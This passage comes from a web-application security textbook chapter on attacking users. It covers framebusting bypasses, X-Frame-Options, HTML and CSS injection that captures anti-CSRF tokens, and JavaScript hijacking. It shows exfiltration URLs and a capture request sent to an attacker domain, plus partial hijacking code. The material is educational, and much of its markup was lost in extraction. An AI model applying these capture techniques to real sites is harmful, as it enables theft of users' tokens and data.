the attacker’s event handler is run when the framebusting code tries to
set the location of the top-level frame. The attacker’s code can perform a
further redirect to a URL that returns an HTTP 204 (No Content) response.
This causes the browser to cancel the chain of redirection calls and leaves
the URL of the top-level frame unchanged.
n The top-level frame can defi ne the sandbox attribute when loading the
target application into a child frame. This disables scripting in the child
frame while leaving its cookies enabled.
cc1133..iinndddd 551144 88//1199//22001111 1122::1133::5588 PPMM
Stuttard c13.indd V4 - 08/17/2011 Page 515
Chapter 13 n Attacking Users: Other Techniques 515
n The top-level frame can leverage the IE XSS fi lter to selectively disable the
framebusting script within the child frame, as described in Chapter 12. When
the attacker’s page specifi es the URL for the iframe target, it can include a
new parameter whose value contains a suitable part of the framebusting
script. The IE XSS fi lter identifi es script code within both the parameter
value and the response from the target application and disables the script
in the response in an effort to protect the user.
TRY IT!
http://mdsec.net/auth/406/
Preventing UI Redress
The current consensus is that although some kinds of framebusting code may
hinder UI redress attacks in some situations, this technique should not be relied
on as a surefi re defense against these attacks.
A more robust method for an application to prevent an attacker from fram-
ing its pages is to use the X-Frame-Options response header. It was introduced
with Internet Explorer 8 and has since been implemented in most other popular
browsers. The X-Frame-Options header can take two values. The value deny
instructs the browser to prevent the page from being framed, and sameorigin
instructs the browser to prevent framing by third-party domains.
TIP When analyzing any antiframing defenses employed within an applica-
tion, always review any related versions of the interface that are tailored for
mobile devices. For example, although wahh-app.com/chat/ might defend
robustly against framing attacks, there may be no defenses protecting wahh-
app.com/mobile/chat/. Application owners often overlook mobile versions
of the user interface when devising antiframing defenses, perhaps on the
assumption that a UI redress attack would be impractical on a mobile device.
However, in many cases, the mobile version of the application runs as normal
when accessed using a standard (nonmobile) browser, and user sessions are
shared between both versions of the application.
Capturing Data Cross-Domain
The same-origin policy is designed to prevent code running on one domain
from accessing content delivered from a different domain. This is why cross-
site request forgery attacks are often described as “one-way” attacks. Although
cc1133..iinndddd 551155 88//1199//22001111 1122::1133::5588 PPMM
Stuttard c13.indd V4 - 08/17/2011 Page 516
516 Chapter 13 n Attacking Users: Other Techniques
one domain may cause requests to a different domain, it may not easily read
the responses from those requests to steal the user’s data from a different
domain.
In fact, various techniques can be used in some situations to capture all or
part of a response from a different domain. These attacks typically exploit some
aspect of the target application’s functionality together with some feature of
popular browsers to allow cross-domain data capture in a way that the same-
origin policy is intended to prevent.
Capturing Data by Injecting HTML
Many applications contain functionality that allows an attacker to inject some
limited HTML into a response that is received by a different user in a way that
falls short of a full XSS vulnerability. For example, a web mail application may
display e-mails containing some HTML markup but block any tags and attributes
that can be used to execute script code. Or a dynamically generated error mes-
sage may fi lter a range of expressions but still allow some limited use of HTML.
In these situations, it may be possible to leverage the HTML-injection condi-
tion to cause sensitive data within the page to be sent to the attacker’s domain.
For example, in a web mail application, the attacker may be able to capture the
contents of a private e-mail message. Alternatively, the attacker may be able to
read an anti-CSRF token being used within the page, allowing him to deliver
a CSRF attack to forward the user’s e-mail messages to an arbitrary address.
Suppose the web mail application allows injection of limited HTML into the
following response:
[ limited HTML injection here ]
...
...
Following the injection point, the page contains an HTML form that includes
a CSRF token. In this situation, an attacker could inject the following text into
the response:
 tag is not closed. This causes the browser to
treat the text following the injection point as part of the URL, up until a single
quotation mark is encountered, which happens later in the response when a
quoted JavaScript string appears. Browsers tolerate all the intervening characters
and the fact that the URL spans several lines.
When the user’s browser processes the response into which the attacker has
injected, it attempts to fetch the specifi ed image and makes a request to the
following URL, thereby sending the sensitive anti-CSRF token to the attacker’s
server:
http://mdattacker.net/capture?html=......
 var%20_StatsTrackerId=
An alternative attack would be to inject the following text:
This attack injects a  tag targeting the attacker’s domain before the 
tag used by the application itself. In this situation, when browsers encounter
the nested  tag, they ignore it and process the form in the context of the
fi rst  tag that was encountered. Hence, if the user submits the form, all
its parameters, including the sensitive anti-CSRF token, are submitted to the
attacker’s server:
POST /capture HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 192
Host: mdattacker.net
nonce=2230313740821&...
Since this second attack injects only well-formed HTML, it may be more
effective against fi lters designed to allow a subset of HTML in echoed inputs.
However, it also requires some user interaction to succeed, which may reduce
its effectiveness in some situations.
Capturing Data by Injecting CSS
In the examples discussed in the preceding section, it was necessary to use some
limited HTML markup in the injected text to capture part of the response cross-
domain. In many situations, however, the application blocks or HTML-encodes
the characters  in the injected input, preventing the introduction of any
new HTML tags. Pure text injection conditions like this are common in web
applications and are often considered harmless.
cc1133..iinndddd 551177 88//1199//22001111 1122::1133::5599 PPMM
Stuttard c13.indd V4 - 08/17/2011 Page 518
518 Chapter 13 n Attacking Users: Other Techniques
For example, in a web mail application, an attacker may be able to introduce
some limited text into the response of a target user via the subject line of an
e-mail. In this situation, the attacker may be able to capture sensitive data cross-
domain by injecting CSS code into the application.
In the example already discussed, suppose the attacker sends an e-mail with
this subject line:
{}*{font-family:’
Since this does not contain any HTML metacharacters, it will be accepted
by most applications and displayed unmodifi ed in responses to the recipi-
ent user. When this happens, the response returned to the user might look
like this:
WahhMail Inbox
...
{}*{font-family:’
...
...
...
This response obviously contains HTML. Surprisingly, however, some brows-
ers allow this response to be loaded as a CSS stylesheet and happily process any
CSS defi nitions it contains. In the present case, the injected response defi nes the
CSS font-family property and starts a quoted string as the property defi nition.
The attacker’s injected text does not close the string, so it continues through the
rest of the response, including the hidden form fi eld containing the sensitive
anti-CSRF token. (Note that it is not necessary for CSS defi nitions to be quoted.
However, if they are not, they terminate at the next semicolon character, which
may occur before the sensitive data that the attacker wants to capture.)
To exploit this behavior, an attacker needs to host a page on his own domain
that includes the injected response as a CSS stylesheet. This causes any embed-
ded CSS defi nitions to be applied within the attacker’s own page. These can
cc1133..iinndddd 551188 88//1199//22001111 1122::1133::5599 PPMM
Stuttard c13.indd V4 - 08/17/2011 Page 519
Chapter 13 n Attacking Users: Other Techniques 519
then be queried using JavaScript to retrieve the captured data. For example, the
attacker can host a page containing the following:
document.write(‘’);
This page includes the relevant URL from the web mail application as a
stylesheet and then runs a script to query the font-family property, which
has been defi ned within the web mail application’s response. The value of
the font-family property, including the sensitive anti-CSRF token, is then
transmitted to the attacker’s server via a dynamically generated request for
the following URL:
http://mdattacker.net/capture?%27%3C/td%3E%0D%0A...%0D%0A%3Cform%20
action%3D%22 http%3A//wahh-mail.com/forwardemail%22%20method%3D%22POST%2
2%3E%0D%0A%3Cinput%2 0type%3D%22hidden%22%20name%3D%22nonce%22%20value%3
D%222230313740821%22%3E%0D %0A%3Cinput%20type%3D%22submit%22%20value%3D%
22Forward%22%3E%0D%0A...%0D%0A%3C/ form%3E%0D%0A...%0D%0A%3Cscript%3E%0D
%0Avar%20_StatsTrackerId%3D%27AAE78F27CB32 10D%27
This attack works on current versions of Internet Explorer. Other browsers
have modifi ed their handling of CSS includes to prevent the attack from work-
ing, and it is possible that IE may also do this in the future.
JavaScript Hijacking
JavaScript hijacking provides a further method of capturing data cross-domain,
turning CSRF into a limited “two-way” attack. As described in Chapter 3, the
same-origin policy allows one domain to include script code from another
domain, and this code executes in the context of the invoking domain, not the
issuing domain. This provision is harmless provided that application responses
that are executable using a cross-domain script contain only nonsensitive code,
which is static and accessible by any application user. However, many of today’s
applications use JavaScript to transmit sensitive data, in a way that was not
foreseen when the same-origin policy was devised. Furthermore, developments
in browsers mean that an increasing range of syntax is becoming executable
as valid JavaScript, with new opportunities for capturing data cross-domain.
The changes in application design that fall under the broad “2.0” umbrella
include new ways of using JavaScript code to transmit sensitive data from the
server to the client. In many situations, a fast and effi cient way to update the
user interface via asynchronous requests to the server is to dynamically include
script code that contains, in some form, the user-specifi c data that needs to be
displayed.
cc1133..iinndddd 551199 88//1199//22001111 1122::1133::5599 PPMM
Stuttard c13.indd V4 - 08/17/2011 Page 520
520 Chapter 13 n Attacking Users: Other Techniques
This section examines various ways in which dynamically executed script
code can be used to transmit sensitive data. It also considers how this code can
be hijacked to capture the data from a different domain.
Function Callbacks
Consider an application that displays the current user’s profi le information
within the user interface when she clicks the appropriate tab. To provide a
seamless user experience, the information is fetched using an asynchronous
request. When the user clicks the Profi le tab, some client-side code dynamically
includes the following script:
https://mdsec.net/auth/420/YourDetailsJson.ashx
The response from this URL contains a callback to an already-defi ned func-
tion that displays the user’s details within the UI:
showUserInfo(
[
[ ‘Name’, ‘Matthew Adamson’ ],
[ ‘Username’, ‘adammatt’ ],
[ ‘Password’, ‘4nl1ub3’ ],
[ ‘Uid’, ‘88’ ],
[ ‘Role’, ‘User’ ]
]);
An attacker can capture these details by hosting his own page that imple-
ments the showUserInfo function and includes the script that delivers the profi le
information. A simple proof-of-concept attack is as follows:
If a user who accesses the attacker’s page is simultaneously logged in to the
vulnerable application, the attacker’s page dynamically includes the script
containing the user’s profi le information. This script calls the showUserInfo
function, as implemented by the attacker, and his code receives the user’s profi le
details, including, in this instance, the user’s password.
TRY IT!
http://mdsec.net/auth/420/
cc1133..iinndddd 552200 88//1199//22001111 1122::1133::5599 PPMM
Stuttard c13.indd V4 - 08/17/2011 Page 521
Chapter 13 n Attacking Users: Other Techniques 521
JSON
In a variation on the preceding example, the application does not perform a
function callback in the dynamically invoked script, but instead just returns
the JSON array containing the user’s details:
[
[ ‘Name’, ‘Matthew Adamson’ ],
[ ‘Username’, ‘adammatt’ ],
[ ‘Password’, ‘4nl1ub3’ ],
[ ‘Uid’, ‘88’ ],
[ ‘Role’, ‘User’ ]
]
As described in Chapter 3, JSON is a fl exible notation for representing arrays
of data and can be consumed directly by a JavaScript interpreter.
In older versions of Firefox, it was possible to perform a cross-domain script
include attack to capture this data by overriding the default Array constructor
in JavaScript. For example:
function capture(s) {
alert(s);
}
function Array() {
for (var i = 0; i 
This attack modifi es the default Array object and defi nes a custom setter
function, which is invoked when values are assigned to elements in an array. It
then executes the response containing the JSON data. The JavaScript interpreter
consumes the JSON data, constructs an Array to hold its values, and invokes
the attacker’s custom setter function for each value in the array.
Since this type of attack was discovered in 2006, the Firefox browser has been
modifi ed so that custom setters are not invoked during array initialization. This
attack is not possible in current browsers.
TRY IT!
http://mdsec.net/auth/409/
You need to download version 2.0 of Firefox to exploit this example. You
can download this from the following URL:
www.oldapps.com/firefox.php?old_firefox=26